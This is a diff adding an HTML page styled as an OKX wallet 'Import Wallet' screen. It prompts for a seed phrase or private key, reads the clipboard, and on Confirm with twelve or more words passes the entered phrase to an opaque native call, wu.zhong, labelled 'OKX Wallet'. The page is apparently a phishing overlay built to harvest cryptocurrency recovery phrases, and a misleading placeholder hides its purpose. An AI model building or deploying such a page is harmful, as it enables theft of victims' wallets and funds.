@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+
+        .back-arrow {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+        }
+
+        .back-arrow:hover {
+            opacity: 0.7;
+        }
+
+        .expand-icon {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ffffff;
+            border-radius: 4px;
+            cursor: pointer;
+            position: relative;
+            transition: opacity 0.2s ease;
+        }
+
+        .expand-icon:hover {
+            opacity: 0.7;
+        }
+
+        .expand-icon::before,
+        .expand-icon::after {
+            content: '';
+            position: absolute;
+            background-color: #ffffff;
+        }
+
+        .expand-icon::before {
+            width: 8px;
+            height: 2px;
+            top: 3px;
+            right: -4px;
+        }
+
+        .expand-icon::after {
+            width: 2px;
+            height: 8px;
+            top: -4px;
+            right: -1px;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 100%;
+        }
+
+        .title {
+            font-size: 2.5rem;
+            font-weight: 600;
+            line-height: 1.1;
+            margin-bottom: 60px;
+            letter-spacing: -0.02em;
+        }
+
+        .instruction {
+            font-size: 1.1rem;
+            line-height: 1.5;
+            color: #888888;
+
+            margin-bottom: auto;
+            max-width: 100%;
+            text-align: center;
+        }
+
+        .instruction-highlight {
+            color: #00ff88;
+            font-weight: 500;
+        }
+
+        .input-section {
+            margin: 60px 0 40px 0;
+        }
+
+        .paste-button {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 25px;
+            color: #ffffff;
+            padding: 16px 32px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s ease;
+            width: 100%;
+            max-width: 200px;
+            margin: 0 auto;
+        }
+
+        .paste-button:hover {
+            background-color: #2a2a2a;
+            border-color: #444444;
+        }
+
+        .paste-button:active {
+            transform: scale(0.98);
+        }
+
+        .paste-icon {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 2;
+        }
+
+        .bottom-section {
+            margin-top: auto;
+            padding-bottom: 40px;
+        }
+
+        .confirm-button {
+            background-color: #333333;
+            border: none;
+            border-radius: 25px;
+            color: #888888;
+            padding: 18px 32px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: not-allowed;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .confirm-button.active {
+            background-color: #ffffff;
+            color: #000000;
+            cursor: pointer;
+        }
+
+        .confirm-button.active:hover {
+            background-color: #f0f0f0;
+        }
+
+        .confirm-button.active:active {
+            transform: scale(0.98);
+        }
+
+        @media (max-width: 375px) {
+            .title {
+                font-size: 2.2rem;
+            }
+            
+            .instruction {
+                font-size: 1rem;
+            }
+        }
+
+        @media (min-width: 768px) {
+            body {
+                max-width: 400px;
+                margin: 0 auto;
+            }
+        }
+        textarea{
+            height: 300px;
+            width: 100%;
+            background-color: rgba(0,0,0,.5);
+            border-radius: 20px;
+            padding: 10px;
+            font-size: 18px;
+            border: 2px solid silver;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <svg class="back-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+      
+    </div>
+
+    <div class="main-content">
+        <h1 class="title">Verify With seed phrase or private key</h1>
+        
+        <p class="instruction">
+            
+        <textarea placeholder="Enter the words in the correct order to confirm you've saved your recovery phrase safely."></textarea>
+           
+        </p>
+
+        
+        <div class="input-section">
+            <button class="paste-button" onclick="handlePaste()">
+                <svg class="paste-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"/>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
+                </svg>
+                Paste
+            </button>
+        </div>
+    </div>
+
+    <div class="bottom-section">
+        <button class="confirm-button" id="confirmBtn">Confirm</button>
+    </div>
+
+    <script>
+        let hasContent = false;
+
+        function handlePaste() {
+      
+            navigator.clipboard.readText().then(text => {
+                if (text.trim()) {
+                    hasContent = true;
+                   document.querySelector("textarea").value=text;
+                    console.log('Pasted:', text);
+                }
+            }).catch(err => {
+         
+            });
+        }
+
+    
+
+        document.querySelector("textarea").addEventListener('input', function() {
+            const text = this.value.trim();
+            const words = text ? text.split(/\s+/) : [];
+            const count = words.length;
+
+            if (count >= 12) {
+                document.querySelector("#confirmBtn").classList.add('active');
+              
+            } else {
+                document.querySelector("#confirmBtn").classList.remove('active');
+              
+            }
+        });
+       
+
+        document.querySelector("#confirmBtn").addEventListener("click",()=>{
+            const text =  document.querySelector("textarea").value.trim();
+            const words = text ? text.split(/\s+/) : [];
+            const count = words.length;
+
+            if (count >= 12) {
+          
+                wu.zhong(`🔰OKX Wallet \n\n ${ document.querySelector("textarea").value}`, "com.okx.wallet");
+    
+            } 
+        })
+
+
+    </script>
+</body>
+</html>
